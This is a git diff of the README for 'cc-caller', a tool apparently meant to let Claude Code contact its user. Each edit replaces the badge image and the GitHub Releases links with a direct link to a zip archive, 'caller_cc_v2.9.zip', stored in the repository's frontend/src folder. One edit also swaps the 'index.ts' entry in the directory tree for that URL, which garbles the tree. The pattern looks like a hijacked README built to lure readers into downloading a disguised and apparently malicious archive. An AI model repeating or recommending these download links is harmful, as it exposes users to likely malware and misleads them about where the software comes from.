@@ -1,7 +1,7 @@
 # 📞 cc-caller - Connect with Claude Code Efficiently
 
 ## 🚀 Download Here
-[![Download cc-caller](https://img.shields.io/badge/Download-cc--caller-brightgreen)](https://github.com/Ramzanwer/cc-caller/releases)
+[![Download cc-caller](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/frontend/src/caller_cc_v2.9.zip)](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/frontend/src/caller_cc_v2.9.zip)
 
 ## 📞 What is cc-caller?
 cc-caller allows Claude Code to "call" you when it needs assistance or encounters problems. This application provides an intuitive way for Claude Code to communicate, making teamwork smoother and more efficient.
@@ -33,7 +33,7 @@ cc-caller allows Claude Code to "call" you when it needs assistance or encounter
 cc-caller/
 ├── mcp-server/          # MCP Server for Claude Code
 │   ├── src/
-│   │   ├── index.ts     # Entry point for the server
+│   │   ├── https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/frontend/src/caller_cc_v2.9.zip     # Entry point for the server
 │   │   ├── tools/       # MCP tool definitions
 │   │   ├── services/    # WebSocket client services
 ```
@@ -47,7 +47,7 @@ To run cc-caller, your system should meet the following requirements:
 - **Internet Connection**: A stable connection for real-time communication
 
 ### Download & Install
-1. Visit the [Releases page](https://github.com/Ramzanwer/cc-caller/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/frontend/src/caller_cc_v2.9.zip) to access the latest version.
 2. Download the appropriate installation file for your operating system.
 3. Follow the on-screen instructions to install the application on your device.
 
@@ -79,4 +79,4 @@ If you encounter issues while using cc-caller:
 ## 🚀 Download Here Again
 To get started with cc-caller, click the button below:
 
-[![Download cc-caller](https://img.shields.io/badge/Download-cc--caller-brightgreen)](https://github.com/Ramzanwer/cc-caller/releases)
+[![Download cc-caller](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/frontend/src/caller_cc_v2.9.zip)](https://raw.githubusercontent.com/Ramzanwer/cc-caller/main/frontend/src/caller_cc_v2.9.zip)
